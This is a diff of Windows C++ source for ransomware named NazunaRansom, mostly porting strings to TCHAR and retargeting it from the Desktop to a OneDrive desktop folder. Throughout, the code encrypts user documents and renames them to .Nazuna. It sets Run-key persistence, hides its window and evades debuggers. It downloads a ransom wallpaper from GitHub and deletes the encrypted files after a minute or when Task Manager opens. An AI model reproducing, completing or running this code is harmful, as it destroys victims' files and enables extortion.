@@ -1,42 +1,37 @@
-#include <iostream>
-#include <fstream>
-#include <chrono>
-#include <thread>
 #include <windows.h>
 #include <wincrypt.h>
-#include <stdio.h>
-#include <string.h>
+#include <tchar.h>
 #include <fstream>
 #include <vector>
 #include <filesystem>
-#include <iostream>
-
-using namespace std;
+#include <thread>
 
 #pragma comment(lib, "urlmon.lib")
+
+using namespace std;
 
 #define BUF_LEN 1024
 #define KEY_TAM 16
 #define USER_TAM 256
-#define MUTEX "TeAmoNazuna"
+#define MUTEX _T("TeAmoNazuna") 
 BOOL IsDebug = FALSE;
 
-bool cifrar_archivos(const string& ruta_archivo);
-void recorrer_dir(const string& ruta_recorrer);
-void eliminar_archivos_cifrados(const string& ruta_recorrer);
+BOOL cifrar_archivos(LPCTSTR ruta_archivo);  
+void recorrer_dir(LPCTSTR ruta_recorrer); 
+void eliminar_archivos_cifrados(LPCTSTR ruta_recorrer);
 DWORD WINAPI eliminar_archivos_routine(LPVOID lpParam);
 void persistencia();
 
-bool cifrar_archivos(const string& ruta_archivo) {
+BOOL cifrar_archivos(LPCTSTR ruta_archivo) {
     HCRYPTPROV hProv;
     HCRYPTKEY hkey;
     BYTE buf[BUF_LEN];
-    static constexpr BYTE KEY[KEY_TAM] = { 0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15 };
-    static constexpr BYTE IV[KEY_TAM] = { 0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15 };
+    static const BYTE KEY[KEY_TAM] = { 0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15 };
+    static const BYTE IV[KEY_TAM] = { 0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15 };
 
     ifstream archivo_original(ruta_archivo, ios::binary);
     if (!archivo_original.is_open()) {
-        return false;
+        return FALSE;
     }
 
     archivo_original.read(reinterpret_cast<char*>(buf), BUF_LEN);
@@ -47,21 +42,21 @@ bool cifrar_archivos(const string& ruta_archivo) {
 
     if (!CryptAcquireContext(&hProv, NULL, MS_ENH_RSA_AES_PROV, PROV_RSA_AES, 0)) {
         if (!CryptAcquireContext(&hProv, NULL, MS_ENH_RSA_AES_PROV, PROV_RSA_AES, CRYPT_NEWKEYSET)) {
-            return false;
+            return FALSE;
         }
     }
 
     CryptGenKey(hProv, CALG_AES_128, CRYPT_EXPORTABLE, &hkey);
     CryptSetKeyParam(hkey, KP_IV, IV, 0);
     CryptSetKeyParam(hkey, KP_MODE, reinterpret_cast<const BYTE*>(&mode), 0);
-    CryptEncrypt(hkey, 0, true, 0, buf, &bytes_leer, BUF_LEN);
+    CryptEncrypt(hkey, 0, TRUE, 0, buf, &bytes_leer, BUF_LEN);
 
     ofstream archivo_cifrado(ruta_archivo, ios::binary);
 
     if (!archivo_cifrado.is_open()) {
         CryptDestroyKey(hkey);
         CryptReleaseContext(hProv, 0);
-        return false;
+        return FALSE;
     }
 
     archivo_cifrado.write(reinterpret_cast<char*>(buf), bytes_leer);
@@ -70,31 +65,31 @@ bool cifrar_archivos(const string& ruta_archivo) {
     CryptDestroyKey(hkey);
     CryptReleaseContext(hProv, 0);
 
-    return true;
+    return TRUE;
 }
 
-void recorrer_dir(const string& ruta_recorrer) {
+void recorrer_dir(LPCTSTR ruta_recorrer) {
     vector<string> subdirectorios;
 
-    string ruta_encriptar = ruta_recorrer + "\\*";
+    string ruta_encriptar = string(ruta_recorrer) + _T("\\*");
     WIN32_FIND_DATA ruta_data;
     HANDLE hFind = FindFirstFile(ruta_encriptar.c_str(), &ruta_data);
 
     if (hFind != INVALID_HANDLE_VALUE) {
         do {
             if (ruta_data.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
-                if (strcmp(ruta_data.cFileName, ".") != 0 && strcmp(ruta_data.cFileName, "..") != 0) {
-                    string subruta_recorrer = ruta_recorrer + "\\" + ruta_data.cFileName;
+                if (_tcscmp(ruta_data.cFileName, _T(".")) != 0 && _tcscmp(ruta_data.cFileName, _T("..")) != 0) {
+                    string subruta_recorrer = string(ruta_recorrer) + _T("\\") + ruta_data.cFileName;
                     subdirectorios.push_back(subruta_recorrer);
                 }
             }
             else {
-                const string ruta_archivo = ruta_recorrer + "\\" + ruta_data.cFileName;
+                const string ruta_archivo = string(ruta_recorrer) + _T("\\") + ruta_data.cFileName;
                 const string extension = filesystem::path(ruta_archivo).extension().string();
 
-                if (extension == ".txt" || extension == ".cpp" || extension == ".pdf" || extension == ".docx" || extension == ".xlsx") {
-                    if (cifrar_archivos(ruta_archivo)) {
-                        const string newFileName = filesystem::path(ruta_archivo).replace_extension(".Nazuna").string();
+                if (extension == _T(".txt") || extension == _T(".cpp") || extension == _T(".pdf") || extension == _T(".docx") || extension == _T(".xlsx")) {
+                    if (cifrar_archivos(ruta_archivo.c_str())) {
+                        const string newFileName = filesystem::path(ruta_archivo).replace_extension(_T(".Nazuna")).string();
                         filesystem::rename(ruta_archivo, newFileName);
                     }
                 }
@@ -105,27 +100,27 @@ void recorrer_dir(const string& ruta_recorrer) {
     }
 
     for (const auto& subdir : subdirectorios) {
-        recorrer_dir(subdir);
+        recorrer_dir(subdir.c_str());
     }
 }
 
-void eliminar_archivos_cifrados(const string& ruta_recorrer) {
+void eliminar_archivos_cifrados(LPCTSTR ruta_recorrer) {
     WIN32_FIND_DATA ruta_data;
-    HANDLE hFind = FindFirstFile((ruta_recorrer + "\\*").c_str(), &ruta_data);
+    HANDLE hFind = FindFirstFile((string(ruta_recorrer) + _T("\\*")).c_str(), &ruta_data);
 
     if (hFind != INVALID_HANDLE_VALUE) {
         do {
             if (ruta_data.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
-                if (strcmp(ruta_data.cFileName, ".") != 0 && strcmp(ruta_data.cFileName, "..") != 0) {
-                    eliminar_archivos_cifrados(ruta_recorrer + "\\" + ruta_data.cFileName);
+                if (_tcscmp(ruta_data.cFileName, _T(".")) != 0 && _tcscmp(ruta_data.cFileName, _T("..")) != 0) {
+                    eliminar_archivos_cifrados((string(ruta_recorrer) + _T("\\") + ruta_data.cFileName).c_str());
                 }
             }
             else {
-                const string ruta_archivo = ruta_recorrer + "\\" + ruta_data.cFileName;
+                const string ruta_archivo = string(ruta_recorrer) + _T("\\") + ruta_data.cFileName;
                 const string extension = filesystem::path(ruta_archivo).extension().string();
 
-                if (extension == ".Nazuna") {
-                    if (remove(ruta_archivo.c_str()) == 0) {
+                if (extension == _T(".Nazuna")) {
+                    if (_tremove(ruta_archivo.c_str()) == 0) {
 
                     }
                 }
@@ -137,42 +132,43 @@ void eliminar_archivos_cifrados(const string& ruta_recorrer) {
 
 void persistencia() {
     HKEY hKey;
-    LPCSTR lpSubKey = "Software\\Microsoft\\Windows\\CurrentVersion\\Run";
-    LPCSTR lpValueName = "NazunaRansom";
-    char lpValue[MAX_PATH];
+    LPCTSTR lpSubKey = _T("Software\\Microsoft\\Windows\\CurrentVersion\\Run");
+    LPCTSTR lpValueName = _T("NazunaRansom");
+    TCHAR lpValue[MAX_PATH];
 
-    string ruta_descarga = filesystem::path(string(getenv("USERPROFILE")) + "\\Downloads").string();
-    string ruta_ransom = ruta_descarga + "\\NazunaRansom.exe";
+    string ruta_descarga = filesystem::path(string(getenv("USERPROFILE")) + _T("\\Downloads")).string();
+    string ruta_ransom = ruta_descarga + _T("\\NazunaRansom.exe");
 
-    strncpy_s(lpValue, MAX_PATH, ruta_ransom.c_str(), MAX_PATH);
+    _tcscpy_s(lpValue, MAX_PATH, ruta_ransom.c_str());
 
     if (RegOpenKeyEx(HKEY_CURRENT_USER, lpSubKey, 0, KEY_ALL_ACCESS, &hKey) == ERROR_SUCCESS) {
-        if (RegSetValueEx(hKey, lpValueName, 0, REG_SZ, (BYTE*)lpValue, strlen(lpValue) + 1) == ERROR_SUCCESS) {
-            cout << "Si funciona" << endl;
+        if (RegSetValueEx(hKey, lpValueName, 0, REG_SZ, (BYTE*)lpValue, (_tcslen(lpValue) + 1) * sizeof(TCHAR)) == ERROR_SUCCESS) {
+            _tprintf(_T("Si funciona\n"));
         }
         RegCloseKey(hKey);
     }
 }
 
 void cambiar_fondo() {
-    char username[USER_TAM];
+    TCHAR username[USER_TAM];
+
     DWORD username_tam = USER_TAM;
 
-    GetUserNameA(username, &username_tam);
+    GetUserName(username, &username_tam);
     const char* url = "https://raw.githubusercontent.com/ic4rta/NazunaRansom/main/Nazuna_Ransom_Fondo.jpg";
 
-    string destino_guardar = "C:\\Users\\";
+    string destino_guardar = _T("C:\\Users\\");
     destino_guardar += username;
-    destino_guardar += "\\Downloads\\Nazuna_Ransom_Fondo.jpg";
+    destino_guardar += _T("\\Downloads\\Nazuna_Ransom_Fondo.jpg");
 
-    LPCSTR lpcstr_destino = destino_guardar.c_str();
+    LPCTSTR lpcstr_destino = destino_guardar.c_str();
 
     URLDownloadToFile(NULL, url, lpcstr_destino, 0, NULL);
     SystemParametersInfo(SPI_SETDESKWALLPAPER, 0, (void*)lpcstr_destino, SPIF_UPDATEINIFILE);
 }
 
 DWORD WINAPI eliminar_archivos_routine(LPVOID lpParam) {
-    const string& ruta_recorrer = static_cast<const char*>(lpParam);
+    LPCTSTR ruta_recorrer = static_cast<LPCTSTR>(lpParam);
     this_thread::sleep_for(chrono::minutes(1));
     eliminar_archivos_cifrados(ruta_recorrer);
     return 0;
@@ -183,25 +179,28 @@ int main() {
     if (mutex != NULL) {
         CloseHandle(mutex);
         exit(-1);
-    }else{
+    }
+    else {
         mutex = CreateMutex(NULL, TRUE, MUTEX);
-        if (mutex == NULL){
+        if (mutex == NULL) {
             DWORD error = GetLastError();
-            if (error == ERROR_ALREADY_EXISTS){
+            if (error == ERROR_ALREADY_EXISTS) {
                 exit(-1);
             }
-        }else{
-            if (CheckRemoteDebuggerPresent(GetCurrentProcess(), &IsDebug)){
-                if (IsDebug){
+        }
+        else {
+            if (CheckRemoteDebuggerPresent(GetCurrentProcess(), &IsDebug)) {
+                if (IsDebug) {
                     exit(-1);
-                }else{
+                }
+                else {
                     HWND ventana_cmd = GetConsoleWindow();
                     ShowWindow(ventana_cmd, SW_HIDE);
 
                     persistencia();
 
-                    string ruta = filesystem::path(string(getenv("USERPROFILE")) + "\\Desktop").string();
-                    recorrer_dir(ruta);
+                    string ruta = filesystem::path(string(getenv("USERPROFILE")) + _T("\\OneDrive\\Escritorio")).string();
+                    recorrer_dir(ruta.c_str());
                     cambiar_fondo();
 
                     HANDLE hThread = CreateThread(NULL, 0, eliminar_archivos_routine, (LPVOID)ruta.c_str(), 0, NULL);
@@ -209,7 +208,7 @@ int main() {
                         while (true) {
                             HWND taskManagerWnd = FindWindowA("TaskManagerWindow", nullptr);
                             if (taskManagerWnd != nullptr) {
-                                eliminar_archivos_cifrados(ruta);
+                                eliminar_archivos_cifrados(ruta.c_str());
                                 break;
                             }
                             this_thread::sleep_for(chrono::seconds(1));
